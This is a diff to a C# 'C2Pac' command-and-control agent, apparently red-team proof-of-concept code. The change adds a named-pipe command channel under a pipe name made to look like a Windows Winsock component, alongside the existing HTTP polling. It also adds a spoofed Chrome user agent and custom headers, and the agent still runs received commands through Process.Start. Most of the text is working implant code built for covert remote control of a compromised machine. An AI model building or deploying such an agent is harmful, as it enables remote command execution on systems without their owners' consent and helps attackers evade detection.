@@ -1,10 +1,11 @@
-﻿using System;
+using System;
 using System.Net.Http;
 using System.Threading.Tasks;
 using System.Diagnostics;
 using System.Text.Json;
 using System.Threading.Tasks;
 using System.Net;
+using System.IO.Pipes;
 
 public class C2Command
 {
@@ -16,12 +17,22 @@ public class C2Command
 
 public class C2Pac
 {
+    //  HTTP C2 variables
     private static readonly HttpClient client = new HttpClient();
     static string url = "http://<updateme>.com/something/page.html";
+    
+    static string customUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36";
+    static string? customHeaderProperty = null;
+    static string? customHeaderValue = null;
+
+    //  Named Pipe C2 variables
+    static string c2PipeServer = ".";
+    static string c2PipeName = "Winsock2\\CatalogChangeListener-182a";
+
+    //  Agent configuration variables
     static char commandDelimiter = ':';
     static int retrieveInterval = 30000;
     static bool debugMode = false;
-    
     public static async Task Main(string[] args)
     {
         Console.WriteLine("[*] Starting C2 agent");
@@ -34,6 +45,7 @@ public class C2Pac
             if (c2Command == null)
             {
                 Console.WriteLine("[!] ERROR: Unable to retrieve command, check C2 endpoint.");
+                System.Environment.Exit(-1);
             }
             else
             {
@@ -52,10 +64,23 @@ public class C2Pac
                     Console.WriteLine("[*] ExecuteCommand Succesful.");
                 }
             }
-            Thread.Sleep(retrieveInterval);    
+            Thread.Sleep(retrieveInterval);
         }
     }
-    
+
+    // this is where we swap out the C2 channel
+    public static async Task<string> RetrieveCommand()
+    {
+        //  HTTP GET example
+        //string command = await RetrieveCommandFromHTTPGet();
+
+        //  Named Pipe example
+        string command = RetrieveFromNamedPipe(c2PipeServer,c2PipeName);
+
+        //  return the command for parsing and execution
+        return command;
+    }
+
     //  parse raw string into C2Command object
     public static C2Command ParseCommand(string inputCommand)
     {
@@ -155,10 +180,10 @@ public class C2Pac
             {
                 if (debugMode)
                 {
-                    Console.WriteLine("No arguments provided.");    
+                    Console.WriteLine("No arguments provided.");
                 }
                 Process.Start(options);
-            }      
+            }
             return 0;
         }
         else
@@ -188,7 +213,7 @@ public class C2Pac
             return -1;
         }
     }
-    
+
     // exit tasks
     public static void ExitModule(string task, string options)
     {
@@ -232,25 +257,26 @@ public class C2Pac
         }
     }
 
-    // this is where we swap out the C2 channel
-    public static async Task<string> RetrieveCommand()
-    {
-        string command = await RetrieveCommandFromHTTPGet();
-        return command;
-    }
-    
     // HTTP GET PoC
     public static async Task<string> RetrieveCommandFromHTTPGet()
     {
         try
         {
             HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, url);
-            request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36");
-            request.Headers.Add("X-Client-Id", "UpdateMe");
+            if (customUserAgent != null)
+            {
+                request.Headers.Add("User-Agent", customUserAgent);
+            }
+            if ((customHeaderProperty != null) && (customHeaderValue != null))
+            {
+                request.Headers.Add(customHeaderProperty, customHeaderValue);
+            }
+
             //request.Headers.Add("Accept", "application/json");
 
             HttpResponseMessage response = await client.SendAsync(request);
             response.EnsureSuccessStatusCode();
+            //  need to include processing for a failed HTTP status code
 
             string responseBody = await response.Content.ReadAsStringAsync();
             return responseBody;
@@ -264,6 +290,62 @@ public class C2Pac
         {
             Console.WriteLine($"[!] ERROR: An unexpected error occurred: {e.Message}");
             return "Exception";
+        }
+    }
+
+    //  Named Pipe PoC
+    public static string RetrieveFromNamedPipe(string pipeServer, string pipeName)
+    {
+        int timeoutMilliseconds = 5000; // 5 seconds timeout
+        string? inputCommand = null;
+        using (NamedPipeClientStream pipeClient = new NamedPipeClientStream(pipeServer, pipeName, PipeDirection.In))
+        {
+            // Connect to the pipe or wait until the pipe is available.
+            Console.WriteLine("[>] Attempting to connect to pipe...");
+            try
+            {
+                pipeClient.Connect(timeoutMilliseconds);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] ERROR: Pipe connection failed with exception: {0}", ex.Message);
+                return null;
+            }
+
+            Console.WriteLine("[>] Connected to pipe.");
+
+            if (pipeClient.IsConnected)
+            {
+                try
+                {
+                    using (StreamReader sr = new StreamReader(pipeClient))
+                    {
+                        // Display the read text to the console
+                        inputCommand = sr.ReadLine();
+                        if (inputCommand != null)
+                        {
+                            Console.WriteLine("[>] Received command from server: {0}", inputCommand);
+                            pipeClient.Dispose();
+                            Console.WriteLine("[>] Disconnected from pipe.");
+                            return inputCommand;
+                        }
+                        else
+                        {
+                            return null;
+                        }
+                    }
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine("[!] ERROR: Caught exception: {0}", e.Message);
+                    return null;
+                }
+            }
+            else
+            {
+                Console.WriteLine("[!] ERROR: Failed to connect to pipe!");
+                return null;
+            }
         }
     }
 }
